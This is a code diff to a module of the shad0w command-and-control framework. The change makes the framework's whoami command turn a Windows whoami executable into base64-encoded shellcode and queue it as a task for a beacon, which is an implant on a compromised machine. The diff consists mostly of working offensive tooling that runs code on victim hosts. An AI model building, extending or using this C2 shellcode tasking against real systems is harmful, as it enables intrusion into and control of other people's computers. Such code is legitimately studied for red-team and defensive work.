@@ -3,10 +3,16 @@
 #
 
 import json
+import base64
 import argparse
 
-EXEC_ID       = 0x4000
-OPCODE_WHOAMI = 0x7000
+from lib import shellcode
+
+# using work around for stager bug
+# EXEC_ID       = 0x4000
+# OPCODE_WHOAMI = 0x7000
+
+TMP_EXEC_ID = 0x3000
 
 ERROR = False
 error_list = ""
@@ -30,13 +36,13 @@ def get_whoami_args(args):
     data = ""
 
     if args.all:
-        return "all"
+        return "/all"
     
     if args.groups:
-        data += "groups"
+        data += "/groups"
     
     if args.privs:
-        data += "privs"
+        data += "/priv"
     
     return data
 
@@ -59,7 +65,7 @@ Examples:
 whoami
 whoami --all
 whoami --privs
-whoami --privs --groups
+whoami --groups
 """
     
     parse = argparse.ArgumentParser(prog='ls',
@@ -92,10 +98,24 @@ whoami --privs --groups
     # this will change to args to args for whoami
     data = get_whoami_args(args)
 
+    # work around for the stager bug
     # make the json
-    data = {"op" : OPCODE_WHOAMI, "args": data}
-    data = json.dumps(data)
-
+    # data = {"op" : OPCODE_WHOAMI, "args": data}
+    # print(data)
+    # data = json.dumps(data)
     # set a task for the current beacon to do
+    # shad0w.beacons[shad0w.current_beacon]["callback"] = whoami_callback
+    # shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, data)
+
+    # do we have arguments to pass to the function?
+    file = "/root/shad0w/bin/whoami.x64.exe"
+
+    # rcode = buildtools.extract_shellcode(beacon_file=file, want_base64=True)
+
+    if len(data) != 0:
+        rcode = base64.b64encode(shellcode.generate(file, None, data, parse=False)).decode()
+    elif len(data) == 0:
+        rcode = base64.b64encode(shellcode.generate(file, None, None, parse=False)).decode()
+
     shad0w.beacons[shad0w.current_beacon]["callback"] = whoami_callback
-    shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, data)
+    shad0w.beacons[shad0w.current_beacon]["task"] = (TMP_EXEC_ID, rcode)
